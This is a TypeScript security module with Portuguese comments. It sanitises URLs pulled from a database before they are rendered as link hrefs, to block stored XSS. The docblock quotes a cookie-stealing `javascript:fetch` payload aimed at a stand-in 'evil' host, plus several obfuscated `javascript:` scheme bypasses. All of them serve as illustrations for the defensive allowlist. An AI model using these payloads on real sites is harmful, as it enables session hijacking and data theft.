/**
 * TCK-016 — Allowlist de esquema para URL vinda do banco.
 *
 * ═════════════════════════════════════════════════════════════════════════════
 * POR QUE ESTE MÓDULO EXISTE (XSS armazenado, achado na revisão da onda 2)
 * ═════════════════════════════════════════════════════════════════════════════
 * `urlSchema` era `z.string().url()`, e `z.string().url()` valida a SINTAXE de
 * um URI — não o protocolo. `javascript:alert(1)` é um URI sintaticamente
 * válido e PASSAVA no schema. Ou seja: um EDITOR podia gravar
 *
 *     socialLinks: { instagram: "javascript:fetch('https://evil/'+document.cookie)" }
 *
 * pela API, sem violar contrato nenhum. Se a página interpolar esse valor em
 * `href`, qualquer visitante que clique — inclusive um ADMIN autenticado —
 * executa script na origem do site. O React 18 apenas AVISA no console; ele não
 * bloqueia. E a CSP não alcança `javascript:` em `href` de um `<a>`.
 *
 * ═════════════════════════════════════════════════════════════════════════════
 * POR QUE ESTA CAMADA CONTINUA EXISTINDO DEPOIS DO CONSERTO DO TCK-003
 * ═════════════════════════════════════════════════════════════════════════════
 * TCK-003 fechou a ESCRITA (DEC-022): `urlSchema` agora recusa esquema fora de
 * `http:`/`https:`. Isso não torna esta camada redundante, por uma razão que
 * não depende de código nenhum: **linha já gravada não passa por validação
 * nova**. Todo `socialLinks` escrito antes da DEC-022 continua no banco
 * exatamente como estava, e é ele que a página renderiza.
 *
 * O que este módulo NÃO faz é ter opinião própria sobre o que é seguro: a
 * decisão é delegada a `isSafeHttpUrl` de `@/lib/schemas` — a mesma função que
 * o schema de escrita usa. Duas implementações do mesmo predicado divergiriam
 * na primeira regra nova (foi assim que a recusa de credenciais embutidas,
 * `https://user:senha@host`, entrou só de um lado). Aqui só se acrescenta o que
 * a renderização exige e a validação não: devolver a forma NORMALIZADA.
 *
 * Confiar no banco seria o mesmo erro que o docblock de `embeds.ts` argumenta
 * contra ao validar o ID de embed — o mesmo critério vale aqui.
 *
 * ═════════════════════════════════════════════════════════════════════════════
 * POR QUE NÃO BASTA UM `startsWith('javascript:')`
 * ═════════════════════════════════════════════════════════════════════════════
 * Antes de resolver um `href`, o agente de usuário normaliza a string:
 * remove TAB, LF e CR de QUALQUER posição e apara controles/espaço das pontas.
 * Por isso todas estas formas executam no browser e escapam de uma comparação
 * ingênua:
 *
 *     "JAVASCRIPT:alert(1)"        (esquema é case-insensitive)
 *     "  javascript:alert(1)"      (espaço à frente, aparado)
 *     "java\tscript:alert(1)"      (TAB no meio do esquema, removido)
 *     "java\nscript:alert(1)"      (idem com LF/CR)
 *     "\u0001javascript:alert(1)"    (controle C0 à frente, aparado)
 *
 * A defesa correta é NORMALIZAR IGUAL AO BROWSER e só então decidir — e devolver
 * a forma normalizada, nunca a original: devolver `"java\tscript:…"` porque "não
 * começa com javascript:" colocaria a carga intacta no DOM, e o browser faria a
 * limpeza que nós recusamos fazer.
 *
 * ALLOWLIST, não blocklist: `javascript:`, `data:` e `vbscript:` são só os três
 * esquemas executáveis que se lembra hoje. Um link de rede social só faz sentido
 * em `http:`/`https:`; qualquer outra coisa é rejeitada por padrão, e esquemas
 * novos não abrem buraco.
 *
 * Módulo puro. Nada aqui lança: entrada hostil devolve `null`, e quem consome
 * decide entre omitir o link ou renderizar texto sem `href`.
 */

import { SAFE_URL_PROTOCOLS, isSafeHttpUrl } from '@/lib/schemas';

/**
 * Únicos esquemas que viram `href` no produto. Reexportado de `@/lib/schemas`
 * — a allowlist é a MESMA da camada de escrita, nunca uma cópia.
 */
export const ALLOWED_URL_PROTOCOLS: readonly string[] = SAFE_URL_PROTOCOLS;

/**
 * Controles C0 e espaço nas pontas — o que o agente de usuário APARA antes de
 * resolver o href (WHATWG URL, "strip leading and trailing C0 control or space").
 */
const LEADING_TRAILING_CONTROL = /^[\u0000-\u0020]+|[\u0000-\u0020]+$/g;

/**
 * TAB, LF e CR em QUALQUER posição — o que o agente de usuário REMOVE, e o que
 * transforma `java\tscript:` em `javascript:` na hora de navegar.
 */
const INLINE_TAB_NEWLINE = /[\t\n\r]/g;

/**
 * Normaliza a string exatamente como o browser faria antes de resolver o
 * `href`. É esta forma — e não a original — que precisa ser inspecionada E
 * renderizada.
 */
export function normalizeUrlCandidate(value: string): string {
  return value.replace(LEADING_TRAILING_CONTROL, '').replace(INLINE_TAB_NEWLINE, '');
}

/**
 * Devolve a URL absoluta segura e já normalizada, ou `null` quando o valor não
 * passa em `isSafeHttpUrl` — o que cobre esquema fora da allowlist, URL
 * relativa (que `new URL` sem base rejeita), host vazio e credenciais
 * embutidas.
 *
 * O retorno é `URL.toString()`: forma canônica, sem controles, com os
 * caracteres perigosos percent-encoded. O que vai para o DOM é o que foi
 * inspecionado — devolver o valor cru seria entregar a carga intacta e deixar
 * a limpeza para o browser.
 */
export function toSafeExternalUrl(value: unknown): string | null {
  if (typeof value !== 'string') return null;

  const normalized = normalizeUrlCandidate(value);
  if (normalized.length === 0) return null;

  // Predicado compartilhado com a camada de escrita (DEC-022): as duas pontas
  // não têm como divergir.
  if (!isSafeHttpUrl(normalized)) return null;

  return new URL(normalized).toString();
}

/** Versão booleana, para asserção e para guarda de tipo em filtros. */
export function isSafeExternalUrl(value: unknown): boolean {
  return toSafeExternalUrl(value) !== null;
}
